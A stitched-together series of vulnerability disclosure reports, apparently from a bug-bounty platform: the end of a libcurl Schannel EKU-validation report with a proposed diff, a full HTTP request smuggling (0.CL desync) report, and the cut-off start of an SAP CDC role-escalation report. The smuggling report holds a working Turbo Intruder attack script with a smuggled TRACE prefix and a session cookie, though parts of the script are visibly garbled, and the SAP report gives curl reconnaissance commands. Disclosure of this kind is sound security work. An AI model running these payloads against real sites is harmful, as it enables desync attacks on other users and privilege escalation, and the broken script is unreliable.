Predicted actual behavior on the unpatched Schannel `--cacert` path: the connection succeeds, because `CertGetCertificateChain` is called with no requested EKU and therefore may not set `CERT_TRUST_IS_NOT_VALID_FOR_USAGE`, allowing the existing trust-mask check to pass.

As a control, importing `ca.pem` into the Windows root store and running without `--cacert` should exercise Schannel's native path instead. If that path rejects the certificate, it would further indicate that the EKU gap is specific to the manual custom-CA path.

Two possible fixes stand out.

Option A, minimal: populate `RequestedUsage` before calling `CertGetCertificateChain`:

```diff
-  CERT_CHAIN_PARA ChainPara;
-
-  memset(&ChainPara, 0, sizeof(ChainPara));
-  ChainPara.cbSize = sizeof(ChainPara);
+  CERT_CHAIN_PARA ChainPara;
+  LPSTR serverAuthOID = (LPSTR)szOID_PKIX_KP_SERVER_AUTH;
+
+  memset(&ChainPara, 0, sizeof(ChainPara));
+  ChainPara.cbSize = sizeof(ChainPara);
+  ChainPara.RequestedUsage.dwType = USAGE_MATCH_TYPE_AND;
+  ChainPara.RequestedUsage.Usage.cUsageIdentifier = 1;
+  ChainPara.RequestedUsage.Usage.rgpszUsageIdentifier = &serverAuthOID;
```

Option B, more complete: call `CertVerifyCertificateChainPolicy(CERT_CHAIN_POLICY_SSL, ...)` after chain building. That would align this path more closely with normal Schannel TLS policy evaluation and should cover EKU and related SSL policy checks in a more standard way.

Either approach may be sufficient. Option B seems more robust, while Option A is the smallest targeted change.

Thank you,
AISLE Research Team

## Impact

An attacker who can obtain a hostname-valid certificate from a CA in the victim's custom CURLOPT_CAINFO or CURLOPT_CAINFO_BLOB bundle may be able to bypass server-auth EKU checks on Windows and intercept libcurl connections on the Schannel manual-validation path. This appears limited to custom-CA configurations and is most relevant in private PKI environments where non-server certificates may be issued more broadly; it does not appear to be exploitable with a self-signed certificate.

title: HTTP Request Smuggling
vulnerability_information:
## Summary:
HTTP Request Smuggling is a vulnerability stemming from HTTP/1.1's core weakness, the boundaries between requests on keep-alive connections. In this case, it was possible to achieve a 0.CL desync. This means that it is possible to create a request with a malformed `Content-Length` header, where the frontend ignores the content-length header, but the backend processes it. This discrepancy allows an attacker to take control of other users' requests achieving a range of critical impacts. For more information on request smuggling, and 0.CL desync in general, please refer to this research:

[0.CL Desync Attacks](https://portswigger.net/research/http1-must-die#0.cl-desync-attacks)

## Steps To Reproduce:
1. In Burp Suite, send any valid request who's target is set to `████████` to turbo intruder
2. Paste the following turbo intruder script into the script window
```python
# Refer to https://portswigger.net/research/http1-must-die
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=100,
                           requestsPerConnection=1,
                           engine=Engine.BURP,
                           maxRetriesPerRequest=0,
                           timeout=15
                           )

    # The attack should contain an early-response gadget and a (maybe obfuscated) Content-Length header with the value set to %s
    stage1 = '''POST /CON HTTP/1.1
Host: '''+host+'''
Cookie: baca8f7410f46004b3ebdb56efffd64ce7cc73784001204a5fdd719816850df2=7ce2a3d9e711f9458d5fb71d02dcfaaaeeb2b7bf758fe15ddcb88d58b00c6e9a202a523d
Pragma: no-cache

'''

    # This will get prefixed to the victim's request - place your payload in here

X: x'''



    # If the server doesn't like GET with a body, try OPTIONS etc
    stage2_chopped = '''GET / HTTP/1.1
Content-Length: 123
X: Y'''

    stage2_revealed = '''GET /robots.txt HTTP/1.1
Host: '''+host+'''
Cookie: baca8f7410f46004b3ebdb56efffd64ce7cc73784001204a5fdd719816850df2=7ce2a3d9e711f9458d5fb71d02dcfaaaeeb2b7bf758fe15ddcb88d58b00c6e9a202a523d

'''

    victim = '''GET / HTTP/1.1
Host: '''+host+'''
Cookie: baca8f7410f46004b3ebdb56efffd64ce7cc73784001204a5fdd719816850df2=7ce2a3d9e711f9458d5fb71d02dcfaaaeeb2b7bf758fe15ddcb88d58b00c6e9a202a523d

    # No need to edit below this line
    if '%s' not in stage1:
        raise Exception('Please place %s in the Content-Length header value')

    if not stage1.endswith('\r\n\r\n'):
        raise Exception('Stage1 request must end with a blank line and have no body')


    while True:
        engine.queue(stage1, len(stage2_chopped), label='stage1', fixContentLength=False)
        engine.queue(stage2_chopped + stage2_revealed + smuggled, label='stage2')
        engine.queue(victim, label='victim')


def handleResponse(req, interesting):
    if req.label == "victim":
        table.add(req)

    # 0.CL attacks use a double desync so they can take a while!


```
3. Select "Attack" and wait.
4. In the results table, you can see a simulated victim, interacting with the application. Note that their request towards the home page, occasionally produces a 405 response, instead of the normal 200 response. 
████████

This is achieved because the script is configured with the following prefix.
```python
    # This will get prefixed to the victim's request - place your payload in here
    smuggled = '''TRACE /assets HTTP/1.1
X: x'''
```

When the victim's request ends up appended to this prefix, their request looks like this:
```http
TRACE /assets HTTP/1.1
X: xGET / HTTP/1.1
Host: ████████
Cookie: baca8f7410f46004b3ebdb56efffd64ce7cc73784001204a5fdd719816850df2=7ce2a3d9e711f9458d5fb71d02dcfaaaeeb2b7bf758fe15ddcb88d58b00c6e9a202a523d
Pragma: no-cache
Cache-Control: no-cache
Sec-Ch-Ua-Platform: "Linux"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.44 Safari/537.36
Sec-Ch-Ua: "Not:A-Brand";v="99", "HeadlessChrome";v="145", "Chromium";v="145"
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: script
Referer: https://████████/
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive


```


# Remediation
The most robust remediation for request smuggling is to *never* use HTTP/1 upstream. That means, that besides your very first proxy, *every* web server, including the backend origin server, should use HTTP/2 end-to-end. However, this is often unachievable due to some vendors refusal to adopt HTTP/2 right now. If this is not possible in your case, you must implement *consistent* and *strict* HTTP request and response parsing across *all* proxies in your infrastructure. This often involves configuration proxies to use strict parsing measures in their configuration files. You can find all kinds of advice on this approach at the following link:
[http1mustdie.com](https://http1mustdie.com/)

## Impact

On it's own, this produces a denial of service vulnerability, where regular user traffic produces unexpected 405 errors, rendering the application unusable. However, the same technique can usually chained with other gadgets and vulnerabilities in order to take full control of the application. This is often achieved via a variety of impacts including response queue poisoning, global cross-site scripting, cache poisoning / deception, open redirection and access control bypasses. You can find more information on the plethora of impacts in the following web academy notes:

[Exploiting Request Smuggling](https://portswigger.net/web-security/request-smuggling/exploiting)

title: Privilege-relevant fields are clientModify in SAP CDC schema allowing role escalation to Admin
vulnerability_information:
## Summary

The Gigya / SAP CDC tenant fronting all four `████████.*` sites (████████) was configured with incorrect `writeAccess` permissions on role-and-billing-relevant fields. The full schema is returned unauthenticated by `accounts.getSchema`, and critical fields including `data.role`, `data.org.bpid`, `data.soldTo`, `data.crmId`, `data.orgName`, and others all carry `"writeAccess":"clientModify"`  meaning **any authenticated end-user can set them on their own account from the browser** via the public `accounts.████████` API.

Two of these fields —`data.role` and the per-org `data.org.roles.name`  are the exact fields the `████████.*` login flow reads to determine which authenticated session to issue. The inline login script on every locale executes `gigya.accounts.getAccountInfo` and reads the role from `groups.organizations[0].roles[0]`, then forwards the entire account info object (including user-modifiable `data` fields) to `/████████`.

## Affected Fields with clientModify WriteAccess

```
data.role                       data.org.bpid              data.org.roles.name
data.orgName                    data.orgEntered.orgName    data.orgEntered.duns
data.orgEntered.address.*       data.orgEntered.roles.name
data.crmId                      data.soldTo                data.defaultSoldTo
data.unit                       data.area                  data.level
data.deactivated                data.subscribe             data.terms
data.requestedCompanies         data.additionalCompany
profile.email                   profile.firstName          profile.lastName
profile.city / state / address / zip / country / work.title
```

## Steps To Reproduce

### 1. Verify clientModify writeAccess (no authentication required)

```bash
curl -sk -H "X-HackerOne-Research: ████████" \
     -X POST 'https://████████/accounts.getSchema' \
     --data-urlencode 'apiKey=████████' \
     --data-urlencode 'format=json' \
| python3 -c "
import sys,json
d = json.load(sys.stdin)
critical = ['role','org.bpid','orgName','crmId','soldTo','defaultSoldTo','unit','area','level','deactivated','org.roles.name']
ds = d['dataSchema']['fields']
print('field | writeAccess')
for f in critical:
```
